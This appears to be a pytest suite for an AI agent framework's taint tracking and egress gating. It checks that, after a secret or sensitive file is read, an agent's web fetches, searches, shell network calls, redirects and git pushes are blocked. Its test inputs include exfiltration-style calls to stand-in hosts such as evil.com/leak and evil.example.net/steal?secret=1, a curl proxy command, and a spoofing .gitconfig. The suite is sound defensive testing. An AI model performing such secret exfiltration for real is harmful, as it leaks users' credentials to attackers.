"""Tests for session-scoped taint tracking, egress gating, redirect blocking, and subagent propagation."""

from __future__ import annotations

import asyncio
import importlib.util
from pathlib import Path

import pytest

from engine.execution.react.react_loop import react_event_loop
from engine.llm.contracts import ChatResponse, ToolCallData
from engine.safety.approval import ApprovalBroker, use_approval_context
from engine.safety.risk import RiskTier
from engine.safety.rules import SafetyConfig
from engine.safety.taint import (
    EgressAllowlist,
    EgressTarget,
    SessionTaintStore,
    delete_session_taint,
)
from engine.safety.tool_guard import ToolGuard
from engine.tool.interface import ToolCall
from engine.tool.registry import ToolRegistry

ROOT = Path(__file__).resolve().parents[3]


def _load_web_fetch():
    path = ROOT / "agents" / "tools" / "web_fetch.py"
    spec = importlib.util.spec_from_file_location("web_fetch_taint_test", path)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def test_egress_allowlist_validation_and_matching() -> None:
    for bad in ("*", "*.*", ".com", "*.com", "mcp:*", "invalid:foo"):
        with pytest.raises(ValueError):
            EgressAllowlist([bad])

    al = EgressAllowlist([
        "api.github.com",
        "*.internal.example.com",
        "mcp:local_docs",
        "git:github.com",
        "search:duckduckgo",
    ])
    assert al.allows(EgressTarget("http_host", "api.github.com", "api.github.com"))
    assert not al.allows(EgressTarget("http_host", "evil.github.com", "evil.github.com"))
    assert al.allows(EgressTarget("http_host", "svc.internal.example.com", "svc.internal.example.com"))
    assert not al.allows(EgressTarget("http_host", "internal.example.com", "internal.example.com"))
    assert al.allows(EgressTarget("mcp_server", "mcp:local_docs", "mcp:local_docs"))
    assert not al.allows(EgressTarget("mcp_server", "mcp:slack", "mcp:slack"))
    assert al.allows(EgressTarget("git_remote", "git:github.com", "git push"))
    assert al.allows(EgressTarget("search", "search:duckduckgo", "search:duckduckgo"))


def test_taint_persists_across_turns_and_clears_on_delete(tmp_path: Path) -> None:
    state_dir = tmp_path / "agent"
    store1 = SessionTaintStore(state_dir=state_dir, session_id="sess-42")
    assert not store1.is_tainted
    store1.record("sensitive_file", "read_file", "file:.env", run_id="r1")

    # Reloaded in a new turn/request
    store2 = SessionTaintStore(state_dir=state_dir, session_id="sess-42")
    assert store2.is_tainted
    assert "file:.env" in store2.labels()

    # Delete session cleans up taint file
    delete_session_taint(state_dir, "sess-42")
    store3 = SessionTaintStore(state_dir=state_dir, session_id="sess-42")
    assert not store3.is_tainted


def test_sandboxed_shell_without_network_does_not_trigger_taint_egress_block(
    tmp_path: Path,
) -> None:
    """Cross-design invariant: shell(network=False) has no outbound egress."""
    registry = ToolRegistry()
    registry.register(
        "shell",
        "shell",
        {"type": "object", "properties": {"command": {"type": "string"}, "network": {"type": "boolean"}}},
        lambda command, network=False, environment=None: "ok",
        opaque_command=True,
        permission_level="execute",
        approval_policy="always",
        execution_environment="host",
    )
    store = SessionTaintStore(state_dir=tmp_path / "agent", session_id="s-net")
    store.record("sensitive_file", "read_file", "file:.env")

    guard = ToolGuard(tmp_path / "missing.json", tool_registry=registry.definitions())
    guard.configure_safety(
        SafetyConfig.from_profile_config({"safety": {"taint": {"enabled": True, "on_egress": "deny"}}}),
        taint_store=store,
    )

    # network=False -> allowed to proceed to ordinary sandbox_command approval, NOT taint blocked!
    d_offline = guard.check(ToolCall(id="1", name="shell", arguments={"command": "pytest", "network": False}))
    assert d_offline.approval_required
    assert "[taint-egress-001]" not in d_offline.reason
    assert d_offline.approval_scope is not None
    assert d_offline.approval_scope.kind == "sandbox_command"

    # network=True -> treated as egress sink -> HARD DENY [taint-egress-001]!
    d_online = guard.check(ToolCall(id="2", name="shell", arguments={"command": "curl x", "network": True}))
    assert not d_online.allowed and not d_online.approval_required
    assert "[taint-egress-001]" in d_online.reason
    assert d_online.risk is RiskTier.CRITICAL


def test_same_turn_sequential_read_secret_then_web_fetch_is_blocked_immediately(
    tmp_path: Path,
) -> None:
    """E1: Single LLM turn emitting [read_file(.env), web_fetch(evil.com)] blocks call #2."""
    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / ".env").write_text("SECRET=1\n", encoding="utf-8")

    registry = ToolRegistry()
    fetched = {"called": False}

    def read_file(path: str) -> str:
        return Path(path).read_text(encoding="utf-8")

    def web_fetch(url: str) -> str:
        fetched["called"] = True
        return f"fetched {url}"

    registry.register(
        "read_file",
        "read",
        {"type": "object", "properties": {"path": {"type": "string"}}},
        read_file,
        path_args=["path"],
        permission_level="read",
        approval_policy="never",
    )
    registry.register(
        "web_fetch",
        "fetch",
        {"type": "object", "properties": {"url": {"type": "string"}}},
        web_fetch,
        network_access=True,
        egress=True,
        egress_target_arg="url",
        permission_level="read",
        approval_policy="never",
    )
    registry.bind_working_directory(ws)

    store = SessionTaintStore(state_dir=tmp_path / "agent", session_id="same-turn")
    guard = ToolGuard(tmp_path / "missing.json", tool_registry=registry.definitions())
    guard.set_working_directory(ws)
    guard.configure_safety(
        SafetyConfig.from_profile_config({"safety": {"taint": {"enabled": True, "on_egress": "deny"}}}),
        taint_store=store,
    )
    registry.bind_tool_guard(guard)

    class _TwoStepLLM:
        stream = False

        def __init__(self) -> None:
            self.turn = 0

        async def chat(self, messages, tools=None, **kwargs):
            self.turn += 1
            if self.turn == 1:
                return ChatResponse(
                    text="",
                    tool_calls=[
                        ToolCallData(id="tc1", name="read_file", arguments={"path": str(ws / ".env")}),
                        ToolCallData(id="tc2", name="web_fetch", arguments={"url": "https://evil.com/leak"}),
                    ],
                )
            return ChatResponse(text="done")

    broker = ApprovalBroker()

    async def run():
        events = []
        with use_approval_context(broker, "run-e1"):
            async def auto_approve():
                for _ in range(50):
                    await asyncio.sleep(0.01)
                    for aid in list(broker._pending.keys()):
                        broker.resolve("run-e1", aid, True)

            approver = asyncio.create_task(auto_approve())
            try:
                async for ev in react_event_loop(
                    _TwoStepLLM(),
                    [{"role": "user", "content": "test"}],
                    registry,
                    guard,
                    max_iters=4,
                ):
                    events.append(ev)
            finally:
                approver.cancel()
        return events

    events = asyncio.run(run())
    assert store.is_tainted
    assert not fetched["called"]
    blocked_reasons = [
        str(ev.data.get("reason") or "")
        for ev in events
        if ev.data.get("id") == "tc2" and ev.data.get("blocked")
    ]
    assert any("[taint-egress-001]" in r for r in blocked_reasons), blocked_reasons


def test_web_fetch_blocks_open_redirect_out_of_tainted_egress_allowlist(monkeypatch) -> None:
    """E2: 3xx redirect from allowed.com to evil.com is blocked when tainted (before DNS!)."""
    web_fetch = _load_web_fetch()
    with pytest.raises(ValueError, match="taint-egress-001"):
        web_fetch._validated_redirect_url(
            "https://allowed.example.com/jump",
            "https://evil.example.net/steal?secret=1",
            allowed_egress_hosts=("allowed.example.com",),
        )

    monkeypatch.setattr(web_fetch, "_validate_url", lambda _u: None)
    ok_target = web_fetch._validated_redirect_url(
        "https://allowed.example.com/jump",
        "https://sub.allowed.example.com/ok",
        allowed_egress_hosts=("allowed.example.com", "*.allowed.example.com"),
    )
    assert ok_target == "https://sub.allowed.example.com/ok"


def test_web_search_is_blocked_when_tainted_and_not_allowlisted(tmp_path: Path) -> None:
    """E3: web_search query exfiltration is blocked in tainted session."""
    registry = ToolRegistry()
    registry.register(
        "web_search",
        "search",
        {"type": "object", "properties": {"query": {"type": "string"}}},
        lambda query: "results",
        network_access=True,
        egress=True,
        egress_target_arg="query",
    )
    store = SessionTaintStore(state_dir=tmp_path / "agent", session_id="s-search")
    store.record("private_tool", "memory_ops", "tool:memory_ops")
    guard = ToolGuard(tmp_path / "missing.json", tool_registry=registry.definitions())
    guard.configure_safety(
        SafetyConfig.from_profile_config({"safety": {"taint": {"enabled": True, "on_egress": "deny"}}}),
        taint_store=store,
    )

    decision = guard.check(ToolCall(id="1", name="web_search", arguments={"query": "secret_token_xyz"}))
    assert not decision.allowed and not decision.approval_required
    assert "[taint-egress-001]" in decision.reason


def test_subagent_taint_enforces_hard_deny_and_merges_upward(tmp_path: Path) -> None:
    """E8: Subagent taint always hard-denies egress and merges monotonically back to parent."""
    registry = ToolRegistry()
    registry.register(
        "web_fetch",
        "fetch",
        {"type": "object", "properties": {"url": {"type": "string"}}},
        lambda url: "ok",
        network_access=True,
        egress=True,
        egress_target_arg="url",
    )
    parent_store = SessionTaintStore(state_dir=tmp_path / "agent", session_id="parent")
    parent_guard = ToolGuard(tmp_path / "missing.json", tool_registry=registry.definitions())
    parent_guard.configure_safety(
        # Even if parent uses on_egress=ask, subagent must force deny!
        SafetyConfig.from_profile_config({"safety": {"taint": {"enabled": True, "on_egress": "ask"}}}),
        taint_store=parent_store,
    )

    child_guard, child_taint = parent_guard.fork_for_subagent()
    child_taint.record("sensitive_file", "read_file", "file:.env")

    # Inside subagent, taint egress is HARD DENY (not ask)
    child_dec = child_guard.check(
        ToolCall(id="c1", name="web_fetch", arguments={"url": "https://evil.com"})
    )
    assert not child_dec.allowed and not child_dec.approval_required
    assert "[taint-egress-001]" in child_dec.reason

    # Monotonic merge upward to parent
    parent_store.merge_from(child_taint.sources, as_subagent=True)
    assert parent_store.is_tainted
    assert any("subagent:" in label for label in parent_store.labels())


def test_error_tool_result_still_records_secret_and_sensitive_file_taint(
    tmp_path: Path,
) -> None:
    """H1: Tool output marked is_error=True (e.g. non-zero exit or 'Error:' prefix) must still taint."""
    from engine.tool.interface import ToolResult

    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / ".env").write_text("Error: API_KEY=sk-live-secret-12345678901234567890\n", encoding="utf-8")

    reg = ToolRegistry()
    reg.register(
        "shell",
        "shell",
        {"type": "object", "properties": {"command": {"type": "string"}}},
        lambda command, environment=None: "ok",
        opaque_command=True,
        permission_level="execute",
        approval_policy="always",
        execution_environment="sandbox",
    )
    reg.register(
        "read_file",
        "read",
        {"type": "object", "properties": {"path": {"type": "string"}}},
        lambda path: "ok",
        path_args=["path"],
        permission_level="read",
        approval_policy="never",
    )
    store = SessionTaintStore(state_dir=tmp_path / "agent", session_id="err-taint")
    guard = ToolGuard(tmp_path / "missing.json", tool_registry=reg.definitions())
    guard.set_working_directory(ws)
    guard.configure_safety(
        SafetyConfig.from_profile_config({"safety": {"taint": {"enabled": True, "on_egress": "deny"}}}),
        taint_store=store,
    )

    # Non-zero shell command that printed a secret before exiting 1 (`cat prod.yaml; false`)
    shell_call = ToolCall(id="s1", name="shell", arguments={"command": "cat config/prod.yaml; false"})
    shell_err_res = ToolResult(
        call_id="s1",
        content="[exit_code=1]\nOPENAI_KEY=sk-proj-secret1234567890abcdef123456",
        is_error=True,
        error_kind="provider_error",
    )
    guard.record_post_execution(shell_call, shell_err_res, run_id="r1")
    assert store.is_tainted
    assert any(s.category == "secret_output" for s in store.sources)

    # Repeat guard must NOT have been incremented for the error result
    assert guard._repeat_guard._counts == {}

    # Unexecuted policy_blocked result must NOT taint
    store2 = SessionTaintStore(state_dir=tmp_path / "agent", session_id="blocked-no-taint")
    guard2 = ToolGuard(tmp_path / "missing.json", tool_registry=reg.definitions())
    guard2.set_working_directory(ws)
    guard2.configure_safety(
        SafetyConfig.from_profile_config({"safety": {"taint": {"enabled": True, "on_egress": "deny"}}}),
        taint_store=store2,
    )
    read_call = ToolCall(id="r1", name="read_file", arguments={"path": str(ws / ".env")})
    guard2.record_post_execution(
        read_call,
        ToolResult(call_id="r1", content="[BLOCKED] denied", is_error=True, error_kind="policy_blocked"),
    )
    assert not store2.is_tainted


def test_tainted_session_blocks_shell_when_host_loopback_is_enabled(tmp_path: Path) -> None:
    """H2: When macOS loopback_only is enabled, tainted shell(network=False) is treated as unknown egress."""
    reg = ToolRegistry()
    reg.register(
        "shell",
        "shell",
        {"type": "object", "properties": {"command": {"type": "string"}, "network": {"type": "boolean"}}},
        lambda command, network=False, environment=None: "ok",
        opaque_command=True,
        permission_level="execute",
        approval_policy="always",
        execution_environment="sandbox",
    )
    store = SessionTaintStore(state_dir=tmp_path / "agent", session_id="loopback-taint")
    store.record("sensitive_file", "read_file", "file:.env")

    guard = ToolGuard(tmp_path / "missing.json", tool_registry=reg.definitions())
    guard.set_sandbox_host_loopback(True)
    guard.configure_safety(
        SafetyConfig.from_profile_config(
            {"safety": {"taint": {"enabled": True, "on_egress": "deny", "egress_allowlist": ["api.github.com"]}}}
        ),
        taint_store=store,
    )

    decision = guard.check(
        ToolCall(
            id="lo1",
            name="shell",
            arguments={"command": "curl -x http://127.0.0.1:7890 https://evil.com", "network": False},
        )
    )
    assert not decision.allowed and not decision.approval_required
    assert "[taint-egress-001]" in decision.reason
    assert decision.risk is RiskTier.CRITICAL


def test_web_crawl_enforces_allowed_egress_hosts_on_redirects_and_renderer_routes(
    monkeypatch,
) -> None:
    """H6: web_crawl must enforce allowed_egress_hosts on every 3xx hop and browser route."""
    path = ROOT / "agents" / "tools" / "web_crawl.py"
    spec = importlib.util.spec_from_file_location("web_crawl_taint_test", path)
    assert spec is not None and spec.loader is not None
    crawl = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(crawl)

    fetch = crawl._web_fetch_module()
    monkeypatch.setattr(fetch, "_validate_url", lambda _u: None)
    monkeypatch.setattr(fetch, "_safe_addresses", lambda host, port: [(2, 1, 6, "", ("93.184.216.34", port))])

    class _FakeResp:
        status = 302

        def getheader(self, name: str):
            if name.lower() == "location":
                return "https://evil.example.net/steal?d=secret"
            return None

    class _FakeConn:
        def close(self) -> None:
            pass

    monkeypatch.setattr(fetch, "_request_pinned", lambda *a, **kw: (_FakeConn(), _FakeResp()))

    with pytest.raises(ValueError, match="taint-egress-001"):
        crawl._download(
            "https://allowed.example.com/jump",
            5.0,
            allowed_egress_hosts=("allowed.example.com",),
        )

    # Also verify _BrowserRenderer.render blocks subresource routes outside allowlist
    aborted: list[str] = []
    continued: list[str] = []

    class _FakeRoute:
        def __init__(self, url: str) -> None:
            self.url = url

        def abort(self, reason: str) -> None:
            aborted.append(f"{self.url}:{reason}")

        def continue_(self) -> None:
            continued.append(self.url)

    class _FakeRequest:
        def __init__(self, url: str) -> None:
            self.url = url

    class _FakePage:
        def goto(self, url, **kw):
            pass

        def wait_for_load_state(self, *a, **kw):
            pass

        def evaluate(self, expr):
            return 100

        def wait_for_timeout(self, ms):
            pass

        def content(self):
            return "<html>ok</html>"

        def close(self):
            pass

    class _FakeContext:
        def route(self, _pat, handler):
            handler(_FakeRoute("https://allowed.example.com/app.js"), _FakeRequest("https://allowed.example.com/app.js"))
            handler(_FakeRoute("https://evil.example.net/beacon.gif"), _FakeRequest("https://evil.example.net/beacon.gif"))

        def new_page(self):
            return _FakePage()

        def close(self):
            pass

    class _FakeBrowser:
        def new_context(self, **kw):
            return _FakeContext()

    renderer = object.__new__(crawl._BrowserRenderer)
    renderer._browser = _FakeBrowser()
    html = renderer.render(
        "https://allowed.example.com/page",
        allowed_egress_hosts=("allowed.example.com",),
    )
    assert html == "<html>ok</html>"
    assert continued == ["https://allowed.example.com/app.js"]
    assert aborted == ["https://evil.example.net/beacon.gif:blockedbyclient"]


def test_git_push_host_respects_pushurl_insteadof_and_fails_closed_on_ambiguity(
    tmp_path: Path,
) -> None:
    """M2: git push egress target must resolve actual push URL (pushurl/insteadOf) and fail closed."""
    import subprocess
    from engine.safety.taint import _extract_git_remote_host

    repo = tmp_path / "repo"
    repo.mkdir()
    subprocess.run(["git", "init", "-b", "main"], cwd=repo, check=True, capture_output=True)
    subprocess.run(
        ["git", "remote", "add", "origin", "https://github.com/org/repo.git"],
        cwd=repo,
        check=True,
        capture_output=True,
    )
    assert _extract_git_remote_host(repo) == "github.com"

    # pushurl override must win over fetch url
    subprocess.run(
        ["git", "remote", "set-url", "--push", "origin", "https://evil-push.example.com/org/repo.git"],
        cwd=repo,
        check=True,
        capture_output=True,
    )
    assert _extract_git_remote_host(repo) == "evil-push.example.com"

    # pushInsteadOf rewrite must be reflected by git remote get-url --push
    # (unset explicit pushurl first because git only applies pushInsteadOf when
    # no explicit pushurl is set).
    subprocess.run(
        ["git", "config", "--unset-all", "remote.origin.pushurl"],
        cwd=repo,
        check=True,
        capture_output=True,
    )
    subprocess.run(
        ["git", "config", "url.https://rewritten.example.org/.pushInsteadOf", "https://github.com/"],
        cwd=repo,
        check=True,
        capture_output=True,
    )
    assert _extract_git_remote_host(repo) == "rewritten.example.org"

    # Multiple pushurls pointing to different hosts fail closed to "unknown"
    subprocess.run(
        ["git", "config", "--add", "remote.origin.pushurl", "https://github.com/org/repo.git"],
        cwd=repo,
        check=True,
        capture_output=True,
    )
    subprocess.run(
        ["git", "config", "--add", "remote.origin.pushurl", "https://evil-mirror.example.com/org/repo.git"],
        cwd=repo,
        check=True,
        capture_output=True,
    )
    assert _extract_git_remote_host(repo) == "unknown"

    # Ambiguous multi-remote repo with no upstream/pushDefault fails closed to "unknown"
    subprocess.run(
        ["git", "remote", "add", "upstream", "https://gitlab.com/org/repo.git"],
        cwd=repo,
        check=True,
        capture_output=True,
    )
    assert _extract_git_remote_host(repo) == "unknown"


def test_taint_git_env_matches_git_ops_and_ignores_workspace_dot_gitconfig(
    tmp_path: Path,
) -> None:
    """M2: taint._safe_git_environment matches git_ops._safe_environment exactly
    (GIT_CONFIG_GLOBAL/SYSTEM=/dev/null), so a workspace .gitconfig cannot spoof
    the push host resolved by the guard vs the actual git_ops push."""
    import os
    import subprocess
    from engine.safety.taint import _extract_git_remote_host, _safe_git_environment

    git_ops_path = ROOT / "agents" / "tools" / "git_ops.py"
    spec = importlib.util.spec_from_file_location("git_ops_env_parity_test", git_ops_path)
    assert spec is not None and spec.loader is not None
    git_ops = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(git_ops)

    repo = tmp_path / "repo"
    repo.mkdir()
    subprocess.run(["git", "init", "-b", "main"], cwd=repo, check=True, capture_output=True)
    subprocess.run(
        ["git", "remote", "add", "origin", "https://evil.example.com/org/repo.git"],
        cwd=repo,
        check=True,
        capture_output=True,
    )
    subprocess.run(
        ["git", "remote", "add", "decoy", "https://allowed.example.com/org/repo.git"],
        cwd=repo,
        check=True,
        capture_output=True,
    )
    subprocess.run(
        ["git", "config", "branch.main.remote", "origin"],
        cwd=repo,
        check=True,
        capture_output=True,
    )

    # Plant a workspace .gitconfig that tries to spoof pushDefault and pushInsteadOf
    # when HOME=repo_dir without GIT_CONFIG_GLOBAL=/dev/null.
    (repo / ".gitconfig").write_text(
        "[remote]\n"
        "    pushDefault = decoy\n"
        '[url "https://allowed.example.com/"]\n'
        "    pushInsteadOf = https://evil.example.com/\n",
        encoding="utf-8",
    )

    # 1. Exact environment parity with git_ops._safe_environment
    assert _safe_git_environment(repo) == git_ops._safe_environment(str(repo))
    assert _safe_git_environment(repo)["GIT_CONFIG_GLOBAL"] == os.devnull
    assert _safe_git_environment(repo)["GIT_CONFIG_SYSTEM"] == os.devnull

    # 2. Workspace .gitconfig MUST be ignored; guard resolves the real origin host!
    assert _extract_git_remote_host(repo) == "evil.example.com"


def test_scoped_tool_registry_uses_subagent_child_guard_for_taint_allowlist_injection(
    tmp_path: Path,
) -> None:
    """M3: ScopedToolRegistry bound to child_guard injects _allowed_egress_hosts when child is tainted."""
    from engine.tool.registry import ScopedToolRegistry

    seen_hosts: list[object] = []

    def fake_web_fetch(*, url: str, _allowed_egress_hosts=None) -> str:
        seen_hosts.append(_allowed_egress_hosts)
        return f"fetched:{url}"

    reg = ToolRegistry()
    reg.register(
        "web_fetch",
        "fetch",
        {"type": "object", "properties": {"url": {"type": "string"}}},
        fake_web_fetch,
        network_access=True,
        egress=True,
        egress_target_arg="url",
        permission_level="read",
        approval_policy="never",
    )
    parent_store = SessionTaintStore(state_dir=tmp_path / "agent", session_id="m3-parent")
    parent_guard = ToolGuard(tmp_path / "missing.json", tool_registry=reg.definitions())
    parent_guard.configure_safety(
        SafetyConfig.from_profile_config(
            {
                "safety": {
                    "taint": {
                        "enabled": True,
                        "on_egress": "deny",
                        "egress_allowlist": ["allowed.example.com"],
                    }
                }
            }
        ),
        taint_store=parent_store,
    )
    reg.bind_tool_guard(parent_guard)

    child_guard, child_taint = parent_guard.fork_for_subagent()
    # Parent is still clean; ONLY child becomes tainted
    child_taint.record("sensitive_file", "read_file", "file:.env")
    assert not parent_store.is_tainted
    assert child_taint.is_tainted

    scoped = ScopedToolRegistry(reg, ["web_fetch"], tool_guard=child_guard)
    # 1. Blocked host rejected by child_guard backstop inside scoped.execute
    blocked = asyncio.run(
        scoped.execute(ToolCall(id="c1", name="web_fetch", arguments={"url": "https://evil.com"}))
    )
    assert blocked.is_error
    assert "[taint-egress-001]" in blocked.content

    # 2. Allowlisted host gets _allowed_egress_hosts injected from child_guard!
    call_ok = ToolCall(id="c2", name="web_fetch", arguments={"url": "https://allowed.example.com/a"})
    d_ok = child_guard.check(call_ok, audit=False)
    with scoped.authorize_execution(call_ok, approval_id="a1", approval_scope=d_ok.approval_scope):
        ok = asyncio.run(scoped.execute(call_ok))
    assert not ok.is_error, ok.content
    assert seen_hosts == [("allowed.example.com",)]
